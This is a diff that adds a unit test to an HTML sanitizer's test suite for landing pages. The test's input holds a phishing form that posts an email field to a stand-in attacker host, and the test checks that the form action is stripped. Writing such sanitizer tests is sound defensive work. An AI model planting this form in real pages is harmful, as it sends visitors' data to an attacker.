@@ -20,6 +20,22 @@ describe('html-sanitize', () => {
     expect(clean).toContain('https://wa.me/5511999999999');
   });
 
+  it('strips form action to prevent external phishing posts', () => {
+    const dirty = `
+      <h1>Negócio</h1>
+      <p>Texto longo o suficiente para o sanitizer processar o formulário completo.</p>
+      <form action="https://evil.example/steal" method="POST">
+        <input name="email" />
+        <button type="submit">Enviar</button>
+      </form>
+      <a href="https://wa.me/5511999999999">WhatsApp</a>
+    `;
+    const clean = sanitizeLandingHtml(dirty);
+    expect(clean).not.toContain('evil.example');
+    expect(clean).not.toMatch(/action\s*=/i);
+    expect(clean).toContain('<form');
+  });
+
   it('requires heading and CTA for publishable HTML', () => {
     expect(() => assertPublishableLandingHtml('<p>curto</p>')).toThrow(/too short|empty/i);
     expect(() =>
